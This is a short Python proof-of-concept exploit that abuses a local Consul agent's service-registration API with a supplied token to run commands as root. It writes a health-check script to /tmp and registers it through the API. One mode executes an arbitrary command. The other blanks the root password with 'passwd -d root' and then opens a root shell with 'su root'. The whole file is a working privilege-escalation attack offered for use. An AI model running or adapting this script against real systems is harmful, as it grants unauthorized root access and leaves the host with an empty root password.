'''
simple poc for exploiting the consul service to gain root privs

Author: Karim (twitter.com/fsociety_py00)
'''
import requests
import argparse
import tempfile
from os import system
from time import sleep

parser = argparse.ArgumentParser(epilog='poc for exploiting the consul service api to gain root privs')

parser.add_argument('--api_token', '-t', required=True,help='the api token of the consul service')
parser.add_argument('--command', '-c', help='command to be executed as root')
parser.add_argument('--root', action='store_true',help='get root shell ;)')

args = parser.parse_args()

token = args.api_token
command = args.command
tmp = tempfile.gettempdir()

consul_url = "http://127.0.0.1:8500/v1/agent/service/register"

header = {
	"X-Consul-Token": str(token),
}

put_data = {"ID": "fsociety", "Name": "fsociety", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/usr/bin/bash", f"/tmp/consul.sh"], "interval": "10s", "timeout": "1s"}}


def execute_command():
	print('[*] execting command...')
	open(f'{tmp}/consul.sh', 'w').write(f'echo $({command}) > {tmp}/command_result.txt')
	requests.put(consul_url, headers=header, data=put_data)
	sleep(1)
	print(f'[*] output in {tmp}/command_result.txt')
	print('[*] done')

def get_root():
	print('[*] getting root shell !')
	open(f'{tmp}/consul.sh', 'w').write('passwd -d root')
	requests.put(consul_url, headers=header, data=put_data)
	sleep(1)
	print('[*] changed the root password to be empty, logging in... ')
	system('su root')



if command:
	execute_command()

if args.root:
	get_root()